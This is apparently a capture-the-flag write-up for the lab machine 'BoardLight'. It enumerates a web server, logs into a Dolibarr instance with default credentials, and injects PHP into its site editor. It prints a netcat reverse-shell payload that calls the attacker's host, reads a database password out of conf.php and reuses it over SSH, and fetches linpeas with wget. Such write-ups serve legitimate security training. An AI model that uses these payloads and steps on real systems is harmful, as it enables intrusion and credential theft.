![image](https://github.com/user-attachments/assets/931b25c3-641a-48fc-bcc8-2f31982e8618)# BoardLight

![image](https://github.com/user-attachments/assets/2b73bf05-62a1-4243-8386-b94047464da6)

Hi! Today we have a machine **BoardLight**. So, let's start.

## Enumiration

(don't forget to add **board.htb** to `hosts`)

As usually as usual, we start with **nmap**.

![image](https://github.com/user-attachments/assets/9b29279e-1896-45f1-8310-8e26be5d5498)

Here we can see two ports, **http** (80) and **SSH** (22). Well, let's check website.

# Checking HTTP (80 port)

![image](https://github.com/user-attachments/assets/19c61d38-de44-45c2-a2ef-919c80781105)

After browsing the site, I didn't find anything special, so let's check the directories using **gobuster**

```
gobuster dir -u http://board.htb -w /usr/share/dirb/wordlists/common.txt
```

![image](https://github.com/user-attachments/assets/e9e60b7e-ac7c-4e83-8a07-782c2c47d0a4)

Hmm, nothing interesting. Let's check the subdomains.

```
gobuster dns -d board.htb -w subdomains-top1million-5000.txt
```

![image](https://github.com/user-attachments/assets/aea9a0f7-8b5a-494b-b430-0c93de7205c6)

1 subdomain, let's check it out

![image](https://github.com/user-attachments/assets/40bd5fe5-fa4d-470f-9ca5-1131b38b55d2)

And yes! That's it. I tried the standard login and password `admin:admin` and it worked.

![image](https://github.com/user-attachments/assets/6d752c5a-23d4-4226-aa4c-1e3214cec510)

The protection has worked, so we have limitations(

The **websites** tab immediately catches your eye:

![image](https://github.com/user-attachments/assets/4f0738ed-a0e1-4ecb-be16-bcaa40029dab)

Here we can create our own website.

![image](https://github.com/user-attachments/assets/42b0dc9d-7f76-4b5c-bc25-84b26a7209f1)

I created some kind of random website. You can also edit the html code

![image](https://github.com/user-attachments/assets/708ebb79-25ff-4806-b72e-7bde3a7c1e81)

Let's write a simple PHP code for check:

```
<?PHP echo system("whoami");?>
```

![image](https://github.com/user-attachments/assets/174d5968-20c8-4cd8-bddf-9fbf957e3bca)

Save and click on the binoculars icon to view our website.

![image](https://github.com/user-attachments/assets/7f66eb6e-9593-405b-b6ea-3ef4afcae1e3)

![image](https://github.com/user-attachments/assets/ec7829c6-b231-49f3-8ddf-984a1a9e03f4)

And here is our vulnerability, the site has issued a response to the `whoami` command. Let's try to get **reverse shell**.

My site crashes VERY often, so it needs to be recreated every time...

```
<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.181 9999 >/tmp/f");?>
```
Instead of my ip, put yours, (you can view it using the command `ip a`, it will be in tun0).

we launch **netcat** through the shell:

```
nc -lvnp 9999
```

Now, save it again and click on the binoculars and we get access to the server!.

# Shell

![image](https://github.com/user-attachments/assets/791538f2-97cf-4cea-873c-d81609b06067)

For convenience, we create a terminal interface.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

In the '/home` directory, we see the user *larissa*, and of course we do not have access to her directory:

![image](https://github.com/user-attachments/assets/0f6d5c46-3097-40ed-8f80-18feca2f3e14)

![image](https://github.com/user-attachments/assets/7fdfcaa2-e6cf-4018-97f6-a549d3029468)

I Googled where the entire dolibarr database is located and as you can see on the [wiki](https://wiki.dolibarr.org/index.php?title=Configuration_file) it says that it is in a file `conf.php `

![image](https://github.com/user-attachments/assets/bbbffe37-269f-4b52-a5f9-b4f5391f0581)

And here is our password and it looks like it is for **larissa**. We have an open **ssh**, so let's try to log in through it.

## Shell as larissa (SSH)

use `larissa:serverfun2$2023!!`

```
ssh larissa@10.10.11.11
```

![image](https://github.com/user-attachments/assets/70b59c50-031c-47a3-be6e-9e7caf9903de)

so we entered as larissa.

![image](https://github.com/user-attachments/assets/e45cfbb3-45e7-4181-8606-381362e1662e)

 And here our ***user flag***. (and other people's exploits ;) )

 ![image](https://github.com/user-attachments/assets/d273b685-0a62-4f24-9058-4ae85dbb241c)

It's sad. But let's transfer our **lineass** to the server (I deleted all other people's files).

Launching our server for transfer:

```
sudo python3 -m http.server 9999
```
and get our linpeas:

```
wget http://10.10.14.181:9999/linpeas.sh
```

launch linpeas with `./linpeas.sh`.

![image](https://github.com/user-attachments/assets/6d87ffc0-0635-4f19-b7cd-4f056140663d)


